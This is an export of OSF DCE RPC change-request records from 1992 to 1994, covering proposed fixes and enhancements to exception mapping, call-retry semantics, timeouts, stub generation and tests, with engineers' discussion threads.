Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/21/93 public]
According to "Application Development Reference", all the RPC error status (ie.
rpc_s_...) will have corresponding exception (ie. rpc_x_...). In current rpc
runtime, the CL rpc does not generate rpc_x_unsupported_protect_level exception
when it gets rpc_s_unsupported_authn_level (or rpc_s_unsupported_protect_level)
error status. While doing a des/non-des testing (simply using perf test case),
I can get the correct rpc_x_unsupported_protect_level exception raised when the
test case was using CO rpc packet privacy level on non-des. However, I will get
an unknown exception raised if I am running CL rpc on non-des DCE. Both CL and
CO are returning correct error status (ie. rpc_s_unsupported_protect_level) if
it gets the unsupported protection level required. Only the exception generated
in CL is wrong. 

After investigating the code, I found several places that need to be changed to 
add the correct rpc_x_unsupported_protect_level exception raised in CL:

 - In rpcexc.h (in sys_idl): need to add the rpc_x_unsupported_protect_level 
   declaration.
 - In dgexec.c and dgclsn.c (in rpc runtime): need to add the corresponding NCA 
   <-> RPC error status mapping (nca_s_unsupported_authn_level <-> 
   rpc_s_unsupported_authn_level). 
 - In sscmaset.c (in stub runtime): need to add the convertion from error code
   (rpc_s_unsupported_authn_level) to exception (rpc_x_unsupported_protect_level).


In addition, I also found that there are some additional code in sscmaset.c and 
dg.c may need to be changed as well, which is regarding to convert fault packet 
back and forth to local error code. This need to be looked into as well.



CR Number                     : 8555
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl compiler
Short Description             : stub epvs generated by idl not const
Reported Date                 : 9/3/93
Found in Baseline             : 1.0.2
Found Date                    : 9/3/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/3/93 public]

Full Description:
        The epvs ( entry point vectors ) and other static data
( that does not change ) should be declared as 'const'. This will
prevent applications from accidentally writing into stub data.



CR Number                     : 8528
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : client runtime should use
state info in comm error conditions
Reported Date                 : 8/29/93
Found in Baseline             : 1.0.2
Found Date                    : 8/29/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/29/93 public]

For non-idempotent calls, different error codes (exceptions) should be 
used once the server may have started the call thread.

In cn, the call packet is sent after the bind is complete.  Thus a 
communications failure (e.g. connection closed) after the call packet has
been sent should report a different error than a communications failure
during the bind.

In dg, (I believe) the cthread is not dispatched until the WAY processing 
completes.  Thus, if the client times out without receiving the WAY
callback, a different error should be raised than when the call fails after
the WAY callback is acknowleged.

This would be a big plus to application writers, since the application
would know when to retry a call (server didn't start cthread) and when 
cleanup might be required on the server end.

[9/30/93 public]

I agree that this would be useful information to make available to the 
application.  

Currently, the SPI contains a call (rpc_call_did_mgr_execute) which
the stubs can use to determine if it's safe to retry a call.  (The stubs
use this call during the processing of an auto handle.)

It would not be possible to make the current mechanism available to
applications (it requires the call handle), but the information is in 
there.

[10/8/93  public]


What is the status on this CR.  It seems to be an important
issue to me.  Is there a chance that this might be fixed in 
1.0.3 ?

Gerry Thome
IBM-Austin

[10/13/93 public]
This will not be fixed in 1.0.3.  I am defering it to 1.1.
The work involved seems substantial.
More info from Mark:

Well, as I said in the CR, the information that you're after is 
already in there.  It's just a matter of figuring out how to get
it to the application.

The problem is that, unlike call handles, binding handles can be
shared, so it's not as easy as just sticking the status into the
binding handle and adding a call like rpc_binding_did_mgr_execute().

One solution would be to store the status into thread-specific 
storage associated with the binding handle.  This would be 
expensive, and it seems bad that the application  would be
forced to make an extra call per rpc to retrieve this information.

Another idea would be to have the status returned through a status
parameter, in the way that [comm status] and [fault status] are
currently handled.  Unfortunately, unlike fault and comm statuses,
this one cannot be overlaid onto a single status parameter, since
you don't want to lose the information about *why* the manager
didn't execute.

A compromise solution might be to allow the ACF file to specify that
the status information should be stored in per thread storage 
associated with the binding handle.

- Mark

[10/15/93 public]

One serious problem app developers face now is the inability to retry
non-idempotent calls upon receiving rpc_x_comm_failure.  Since there
is no indication whether the call failed due to something like a network
outage during the manager execution (don't retry) or before manager
execution (retry) the app writer must take the safe route and just fail.
My experience in using client server apps, is the vast majority of failed
executions occur because of network or server outages existing at the 
time of the call. Thus, most non-idempotent call failures could be retried
either on a different binding (network or server) or periodically on
the same binding. 


I (probably naively) think there are only two or three status/exceptions
involved: rpc_x_comm_failure, rpc_x_connection_closed, and, maybe, 
rpc_x_connection_aborted.  After noting Mark's comment about not losing
server manager failure info, I'd like to propose this: 
1. Add the did_mgr_execute call to the stubs for non-idempotent calls.
2. If the status returned from the call is one of the above, test
   the call handle with did_mgr_execute. 
3. If the response is "no", raise something like rpc_x_comm_failure_no_ex.
   Otherwise, raise the original exception.

Could we take another look at getting this into 1.0.3?

[10/20/93 public]

PROPOSED FIX for 8528

This will be submitted today.

The basic idea is to use the rpc_call_did_mgr_execute during
rpc_ss_call_end_2 to convert certain result statuses in the
case when the manager is known to not have executed.

I liked Mark's notion of adding an acf tag similar to comm_status,
but took this route instead:

  Error handling encapsulation will be *always* be used, so adding
  some new statuses shouldn't hurt too much now.

  I suspect most app writers still haven't caught on to the new load
  of cn exceptions, so we can get them up to speed all at once via
  1.0.3 rel notes.

  This check must be made before retrying non-idempotent rpc failures.
  That is, apps that are retrying on comm_failure are broken now and
  should be fixed.

  This change involves functional changes to one routine 
  (rpc/idl/lib/sscmaset.rpc_ss_call_end_2).  The acf changes were not
  feasible in the 1.0.3 timeframe.

  This change minimizes app changes.  The only way I could come up
  with to use another acf attribute would be to add a boolean argument
  to each rpc and mark it with the new attribute.

The changes were based on and sniff tested (dg only) against dce1.0.3ib7.

New statuses/exceptions returned when manager did not execute:
  rpc_s_comm_failure_before_mgr (in case of rpc_s_comm_failure)
  rpc_s_conn_closed_before_mgr (in case of rpc_s_connection_closed)
  rpc_s_conn_aborted_before_mgr (in case of rpc_s_connection_aborted)


LIBIDL Changes

  rpc/idl/lib/sscmaset.c
    Add exception definition and init for
      rpc_x_comm_failure_before_mgr
      rpc_x_conn_closed_before_mgr
      rpc_x_conn_aborted_before_mgr

  Modify rpc_ss_raise_impl_exception() 
    Add result code to exception mappings for
      rpc_x_comm_failure_before_mgr
      rpc_x_conn_closed_before_mgr
      rpc_x_conn_aborted_before_mgr

  Modify rpc_ss_call_end_2()
    If call handle is valid,
      If call has error status and rpc_call_did_mgr_execute returns false,
        rpc_s_comm_failure      -> rpc_s_comm_failure_before_mgr
        rpc_s_connection_closed -> rpc_s_conn_closed_before_mgr
        rpc_s_connection_aborted-> rpc_s_conn_aborted_before_mgr


SYS IDL Changes

rpc/sys_idl/rpc.msg
  Add new messages to end 

rpc/sys_idl/rpcexc.h
  Add
    rpc_x_comm_failure_before_mgr
    rpc_x_conn_closed_before_mgr
    rpc_x_conn_aborted_before_mgr


LIBDCE
  New symbols exported from libdce.a
    rpc_x_comm_failure_before_mgr
    rpc_x_conn_closed_before_mgr
    rpc_x_conn_aborted_before_mgr



TESTCASES Changes
  Look for specific checks/catches of 
        rpc_[sx]_comm_failure
        rpc_[sx]_connection_closed
        rpc_[sx]_connection_aborted
 
 The only instance I can think of is the print_exception routine in the 
 idl backend tests.


DOCS/RELNOTES

Add new statuses to retry list.
Add rpc_s_rpcd_comm_failure to retry list?
Don't retry non-idempotent rpcs on 
  rpc_s_comm_failure
  rpc_s_connection_closed
  rpc_s_connection_aborted
  (rpc_s_connect_closed_by_rem??)


CAVEATS
  Status convervsion still takes place on calls made on a context handle.
  There may be other cn statuses that should be converted, 
    e.g. rpc_s_connect_closed_by_rem.

Bob Hathaway told Scott Page to add some doc info in the release notes,
as the doc changes probably won't happen.

Gerry Thome for Scott Page

[10/20/93 public]

If this change is made, we'll need to make a few changes over in rebind
code in security (internal_binding.c:rca_retry_status() and probably in a
couple of other places); I suspect other components (DFS's ubik package?
CDS?) will need to make changes as well.

[10/20/93 public]
A quick grep through the 1.0.3 sources shows 55 files which reference
rpc_s_comm_failure:

component:				refs	need change?
	cds				 2	2
	file				24	7
	rpc				 9	?
	security			 5	4
	test/rpc			 5	?
	test/systest			 4	?
	nosupport			 5	?
	time				 1	?

I looked at the files turned up by the grep in cds, file, and security, to
come up with the "need change" column.  This leads me to guestimate that
roughly 20 files would have to be changed to deal with the new _before_mgr
status codes.

Note while many of these places are ones which don't deal with the full
range of CN return codes (and thus wouldn't be broken significantly worse
than now), at least one place in each of component I looked at either
already did the right thing for CN or only had to deal with DG in the first
place.  I can guarantee that the status code change will be likely to break
security server rebinding; you can show this by running a multi-server cell
with one of the security servers taken off line (by kill -9 or the big red
switch).

[10/25/93 public]
There has been lots of email discussion on this.  I want to capture some of
that discussion here.

An alternative proposal has been to add a new attribute to join the
comm_status and fault_status family; something like server_status that
can be used to indicate if the server got the RPC, didn't get it,
don't know, etc.

From email by Bill Sommerfeld:
Basically, I'd like to see things so that the remote call wrappers
found in security (which has a bunch of macros which loop calling the
client stub with different handles in succession until it works) or in
DFS (which has the same thing open-coded in a couple of different
places, both in the CM and in ubik) can be done *in* the client
stubs/libidl with a callback to the application to provide
 - "should we keep going anyway"?
 - "here's the next handle" (with any rpc_binding_set_auth_info() or
other "conditioning" done to it by the application code).

There was the old bind/unbind stuff in the old NCS1.5.x IDL which
apparantly got dropped in the DCE IDL (in favor of context handles).
I think the programming "flavor" that you want is that you supply a
user-defined type which the stub passes to a callback routine to
extract a handle or handles; after the call, you call a second
user-supplied callback routine to decide whether the call succeeded or
failed at an "application" layer, and the information from the RPC can
be provided there..



CR Number                     : 8527
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : cn runtime
Short Description             : cn ignores binding
comm_timeout during tcp connect
Reported Date                 : 8/29/93
Found in Baseline             : 1.0.2
Found Date                    : 8/29/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/29/93 public]

cn rpc should observe the binding comm timeout value when attempting
to connect to a server (as a maximum time to wait before canceling an
unsuccessful connect).  Typically, tcp provides something like a 75
second timeout to try and connect to a remote socket.  There are some
number of circumstances (e.g., recent remote host death) that result in
cn rpc waiting this full timeout instead of quitting after the specified
comm timeout.

This is similar to OT 8224 which addresses timeouts after a connect
is successful, but the bind fails.

This seems like an unecessary difference between cn and dg rpc semantics.

[8/19/94 public]
This is an enhancement.



CR Number                     : 8503
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : Add a means for the user to
control server failure behavior
Reported Date                 : 8/24/93
Found in Baseline             : 1.0.3
Found Date                    : 8/24/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/24/93 public]
Add a facility whereby the user can control the behavior of a server after
an exception has occurred.
The present functionality is that the exception is propagated back to the
client and the server continues running.
Add an ACF attribute [server_action(abort)]. If the server stub is
compiled with this attribute, when the server stub catches an exception
which is not identifiable as having been caused by a communications error
it will cause the server to abort.



CR Number                     : 8357
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : test
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : NULL_UUID and MEMORY_ERROR multiply defined.
Reported Date                 : 7/22/93
Found in Baseline             : 1.0.2
Found Date                    : 7/22/93
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : in test/rpc/rtandidl/moretests tsh_string.h tsh_uuid.h string_free.c
Sensitivity                   : public

[7/22/93 public]

test/rpc/rtandidl/moretests/string_free.c includes tsh_string.h and
tsh_uuid.h which both define NULL_UUID and MEMORY_ERROR causing an ANSI-C
compiler to issue redefinition warnings.



CR Number                     : 8267
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8104
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : osf1
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : RPC CN code doesn't support fork handlers.
Reported Date                 : 7/13/93
Found in Baseline             : 1.0.2
Found Date                    : 7/13/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/13/93 public]

OT 8103 notes that fork handers are not enabled in the DG code. It says that
it will open another defect on fork handeres in the CN code, but I couldn't
find one. In any case, The CN code as shipped by OSF will not support fork
handers. This means that applications which 'fork' will not work in an RPC enviroment. This should be fixed.

[7/14/93 public]

OT 8104 was intended for it. The above sentence should be "applications,
which 'fork' and not immediately exec in a child, will not work in an RPC
enviroment."



CR Number                     : 8130
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Two bindings to same host?
Reported Date                 : 6/9/93
Found in Baseline             : 1.0.3
Found Date                    : 6/9/93
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/9/93 public]
DCE should provide a routine that looks at two RPC binding handles and
tells you if they are going to the same host.  This can be done right
now by converting them to string bindings, parsing out the IP address,
and doing a string compare, but that's an ugly non-portable solution.

A server that uses all protcol sequences have a client that wants, for
whatever reason, to know if it has already spoken to that server.
	void rpc_binding_same_host(
	    rpc_binding_handle_t h1,
	    rpc_binding_handle_t h2,
	    boolean32 onsamehost,
	    error_status_t *st);

In an ideal world there would be another routine that tells if you two
bindings are going to the same process, but that might be harder to
implement:
	void rpc_binding_same_process(
	    rpc_binding_handle_t h1,
	    rpc_binding_handle_t h2,
	    boolean32 insameprocess,
	    error_status_t *st);

[6/9/93 public]

Unless the two binding handles refer to the same protocol,
rpc_binding_same_host is a nontrivial problem to solve.  You cannot easily
know (locally) by looking at two arbitrary-protocol addresses if they
ultimately resolve to the same host.

One possible implementation would be to construct a uuid, ship it to a
remote server (such as rpcd) using the address in handle_1, and see if
handle_2 can get to the remote server to get the uuid back.  [Obviously the
remote server would use all protseqs.]  The remote server would keep a
small cache of these uuids and remove one when a match is made, or after a
reasonable timeout period.

rpc_binding_same_process would need a constraint that requires the handles
are already fully-bound, or otherwise unambiguously-bindable to the same
remote process (similar to the way the rpc_mgmt routines check for
rpc_s_binding_incomplete.)  Otherwise the remote rpcd can arbitrate them to
different processes and the resulting answer would be meaningless.

Just out of curiosity, what's the basis of the application's requirement?

[06/09/93 public]
Sorry, I wasn't thinking of a general solution (is this OSI address
1.23.4.56.1.1.1 the same as IP address 128.23.16.6), but rather for the
case where you can look at the address families.  I meant to imply that by
my description of the work-around. For the general case, stuffing an
	rpc_s_cannot_tell
into *st and returning false is good enough.

DME's license server needs to ensure that it is the only going to get one
binding to a server.  I can imagine other clients that would want to
filter what rpc_ns_binding_import returns so that they don't get
the same server multiple times.  The more I think about it, the more it
seems like a real annoyance.

[05/04/94 public]
There are no plans to do this for 1.1.
Not going to defer (ie send to limbo-land) quite yet.

[5/5/94 public]

Note that even *within* a particular address family, it will not always be
possible to match up the bindings, since nodes may have multiple network 
addresses (i.e., for multi-homed nodes).

I agree that it would be highly desireable to be able to match up the binding
handles that belong to a pargicular server during a binding import (which 
would be easy if we fixed the use of server entries to only contain bindings 
from a single server).

[05/09/94 public]
The barry@osf.org and boaz@osf.org mail addresses do not exist so I have
removed them to stop bouncing mail.



CR Number                     : 8124
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : fix to eliminate compile time warnings
Reported Date                 : 6/9/93
Found in Baseline             : 1.0.2
Found Date                    : 6/9/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/sys_idl/stubbase.h
Sensitivity                   : public

[6/9/93 public]

change

	typedef char rpc_trans_tab_t [256];

to:

	typedef unsigned char rpc_trans_tab_t [256];



CR Number                     : 7730
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 10547
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : app_gd
Short Description             : explain use of acf heap attribute
Reported Date                 : 4/15/93
Found in Baseline             : 1.0.2
Found Date                    : 4/15/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/15/93 public]

Tony received a request from someone to explain (and give an
example if possible) the purpose of the ACF heap attribute.
The App Gd explains how to use it but not why you'd want to.

[5/5/93 public]
This bug relates to an IDL aux control file.  I think it belongs 
to DEC.

[6/22/93 public]
Changed "Fix By Baseline" from 1.0.3 to 1.1.

[07/06/93 public]
Reassigned to writer Steve Lewontin.

[3/29/94 public]

Reassigned this CR to John Shirley (OSF RPC writer) from
Steve Lewontin, although it seems that the responsibility
to address this CR really belongs to DEC, who owns the IDL/ACF
documentation.

[6/8/94 public]

Reassigned this CR to myself - I'm the OSF writer responsible
for the IDL documentation.

[9/15/94 public]

Due to DCE 1.1 resource and schedule constraints, this
CR is being deferred. CR10547 provides a workaround
to a specific enhancement for the heap attribute
documentation, namely, that the documentation needs
to say that the heap attribute is ignored for scalars,
pipes, and context handles.

[6/30/95 public]

Assigned to HP for DCE 1.2.



CR Number                     : 7549
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : test
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rtandidl
Short Description             : string.h ambiguity
Reported Date                 : 3/19/93
Found in Baseline             : 1.0.2b19
Found Date                    : 3/19/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/19/93 public]

In test/rpc/rtandidl/moretests.h there is a file string.idl.  This gets
transformed by the idl compiler into string.h.  That name is ambiguous with
the more generic Un*x string.h include file.



CR Number                     : 7375
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : test
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : test/idl/threads
Short Description             : code references "cma" entrypoints
Reported Date                 : 2/26/93
Found in Baseline             : 1.0.2b17
Found Date                    : 2/26/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/26/93 public]

The test/rpc/idl/threads test uses cma entrypoints and include files
instead of the corresponding pthread versions.  It can/should/must be
changed.



CR Number                     : 7352
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : test
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rtandidl
Short Description             : improper use of strcmp over uuids.
Reported Date                 : 2/24/93
Found in Baseline             : 1.0.2b16
Found Date                    : 2/24/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/24/93 public]

Some of the tests in test/rpc/rtandidl/moretests/bind_handle_tsts.c and
str_binding_tsts.c use strcmp to compare uuids.  These should be cleaned up
to use uuid_equal.



CR Number                     : 7345
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : uninitialized output arguments can cause security hole
Reported Date                 : 2/24/93
Found in Baseline             : 1.0.2
Found Date                    : 2/24/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/24/93 public]

Note that this is an *enhancement* request.

Because DCE security uses encryption, all DCE services must wind up
keeping secrets.

Currently, IDL server stubs do not initialize the buffers for output
arguments before calling into the manager; they thus get whatever "stack
garbage" happens to be there.

That stack garbage *could* contain encryption keys or other non-public
information; an attacker could possibly use this to penetrate the service
or any other it shared a key with.

Rather than requiring all DCE services to zero output arguments before
returning from a manager routine, it seems to me to make much more sense
from a security standpoint to have the stubs call memset(&arg, 0,
sizeof(arg)) on *all* output-only arguments prior to entering the manager
routine.

Alternatively, they could call memset(&arg, 0xe5,sizeof(arg)) or otherwise
initialize the values to something "obviously wrong" (my personal favorites
in this space are hex "words" like "0xdeadbeef" or "0xeffaced").

[7/8/93 public]

This is an inappropriate request. If application code fails to null out
data which could be sensitive this is an error in the application code.
The requested change would affect the performance of all RPC applications
and is undesirable for this reason.

[7/8/93 public]

I reopen and amend my request to ask for an ACF option to turn on this
behavior on a per-interface basis.

We would enable this for all interfaces used by the security server.

[8/27/93 public]

(I tried to clean up some of the comments above, hopefully I didn't make
it worse....)

I don't get it.  Are you worried about attackers from within your own 
process?  Even if you did NULL out all of the arguments sent to a manager
routine, that doesn't prevent the manager routine from climbing up the
stack, or rummaging through memory that doesn't "belong" to it, and finding
other non-public information.



CR Number                     : 6547
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : krpc
Short Description             : combine kernel "login contexts" to save memory
Reported Date                 : 12/21/92
Found in Baseline             : 1.0.1
Found Date                    : 12/21/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/kruntime/sec_authn_krpc.c
Sensitivity                   : public

[12/21/92 public]

It should be possible to get a moderate savings in kernel memory usage by
combining common versions of the pseudo-login-contexts that the kernel rpc
generates.  The savings is more than just the 8 bytes per context; it could
also involve some increased sharing in the DG CCT and the authentication
tables maintained by comauth.c, especially in the presence of DFS's
tendancy to throw away binding handles after only a few minutes.

[3/15/92 public]

This would also reduce the frequency of Cache Mgr upcalls to dfsbind
for security services.
Added kazar, toml to interest list.



CR Number                     : 6541
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : rpc
Subcomponent Name             : dg runtime
Short Description             : Poor choice of certain timers induce a gratuitous retransmission
Reported Date                 : 12/18/92
Found in Baseline             : 1.0.2
Found Date                    : 12/18/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/18/92 public]

The timer that induces retransmission of the final response packet from the
server interacts badly with the timer that induces the client to send an
"ack" (N.B. _not_ "fack").  "ack" sending is (correctly) deferred until
some time after the call completes.  (We're betting that the client is
going to make another call which will be an implicity "ack" of the previous
call's response.)  Unfortunately, the client delays so long that the server
retransmits the final response.  The fix is that the client should probably
send its "ack" sooner.

(Thanks to Dave Bachmann at IBM for noticing this.)

[1/7/93 public]
Promoted to enhancement.

[1/7/93 public]

Perhaps you could share with us why you deem this an enhancement.

[1/8/93 public]

There was a review of the OT RPC data base on 1/6/93 which included 
representatives from DEC, HP, and OSF. It was determined that the CR 
as stated above appears to be accurate, the behavior suboptimal,
but not broken.



CR Number                     : 6497
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : Need ability to determine protocol sequences capable of broadcast RPC
Reported Date                 : 12/16/92
Found in Baseline             : 1.0.2b6
Found Date                    : 12/16/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/16/92 public]
I found a hard-coded use of protocol sequence ncadg_ip_udp in the CDS
advertiser; when I asked about it, Mark Fox said it seemed to be the
best way to ensure that ncacn_ip_tcp wouldn't be chosen.  This limits
the possibility of future protocol sequences on which broadcast RPC
could be supported.  There should be a mechanism comparable to 
rpc_network_inq_protseqs() to return a vector of protocol sequences
capable of broadcast.  That way, there would be no need to hard-code
use of ncadg_ip_udp.



CR Number                     : 6407
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : unreliable method of
generating the number 2 in rpc__naf_desc_inq_naf_id
Reported Date                 : 12/10/92
Found in Baseline             : 1.0.2b5
Found Date                    : 12/10/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/10/92 public]
unreliable method of generating the number 2 in rpc__naf_desc_inq_naf_id
(bytes to copy for sa length).

   886      addr = (rpc_addr_p_t) buff;
   887  #ifndef AIX32
   888      addr->len = sizeof (addr->sa.family);

Since addr->len is subsequently passed into getsockname() as the number of
bytes to copy into the sockaddr(_t), using the size of addr->sa.family
to ensure enough bytes are copied is not reliable.  This method assumes 
that sa.family will always be the first element of the sockaddr.  Although
this works (on 4.3 sockets, anyway), perhaps it would be better to define 
a macro to set how many bytes must be copied to get the family returned in
the sockaddr.  

   889  #else
   890      addr->len = (long) (&(addr->sa.data) - &(addr->sa));

This is illegal pointer arithmetic: subtraction of pointers to structure 
components is illegal.  See aix 3.2 compiler output below.  Although this
could be fixed by casting both the minuend and the subtrahend to pointer
to long, masking compiler errors is not a good idea.  The fix suggested
above would eliminate the need for conditional compilation here.

   891  #endif /* AIX32 */
 
<2033> build OPT_LEVEL=-g comnaf.o
relative path: ./rpc/runtime.
cd ../../../obj/rios/rpc/runtime
xlc_r -c    -DAIX_PROD -M -g  -DNCK -DPROT_NCADG -DPROT_NCACN  -DAUTH_KRB
-DNAF_IP -DDNS_CDS -DDNSPI_V3 -DDNS_V3API   -DRRPC  -Dunix -D_ALL_SOURCE 
-D_BSD=44 -D_ SOCKADDR_LEN  -DNO_SIOCGIFADDR -DNOENCRYPTION -DDEBUG    -I.
-I/home/page/beach/cn/src/rpc/runtime -I/project/dce/build/dce.46e/src/rpc
/runtime  -IRIOS -I/home/page/beach/cn/src/rpc/runtime/RIOS -I/project/dce
/build/dce.46e/src/rpc/runtime/RIOS -I/home/page/beach/cn/export/rios/usr/
include -I/project/dce/build/dce.46e/export/rios/usr/include  ../../../../
src/rpc/runtime/comnaf.c "../../../../src/rpc/runtime/comnaf.c", line 904.
42: 1506-016 (E) Operands must be pointers to compatible types.



CR Number                     : 6101
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : rpc/runtime/cnassoc.c
Short Description             : Scalability problem with rpcd
using CO over TCP/IP
Reported Date                 : 11/16/92
Found in Baseline             : 1.0.1
Found Date                    : 11/16/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/16/92 public]

Full Description:

When running CO protocol over TCP/IP, the RPC runtime does not perform
any retry when connection request failed (unless the timeout value in   e
the binding handle is set to infinite). This problem manifests itself
when the server is listening on a well-known port (e.g. RPC Daemon)
where the request buffers are limited to 10 (TCP/IP).
Apparently the TCP/IP does not perform any retry during the connection
set up phase either.
Consider the case when more than 10 concurrent connect request are
sent to the same RPC Daemon on Machine A (which is possible on a big
system support hundreds of application servers), only the first 10
requests will be able to get through while the rest will be discarded
by the server machine causing connect timed out on the client side.

Repeat By:

      N/A

Proposed Solution:

1. Add retry logic to the CO runtime in case of connect timed out       t
   to alleviate the scaling problem. (in cnassoc.c)

[1/7/93 public]
Cancelled

[1/7/93 public]
Per Doug Hartman's request ... promoted to enhancement.



CR Number                     : 5809
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Auth-maybe calls supported inconsistently
Reported Date                 : 10/26/92
Found in Baseline             : 1.0.2
Found Date                    : 10/26/92
Severity                      : D
Priority                      : 3
Status                        : open
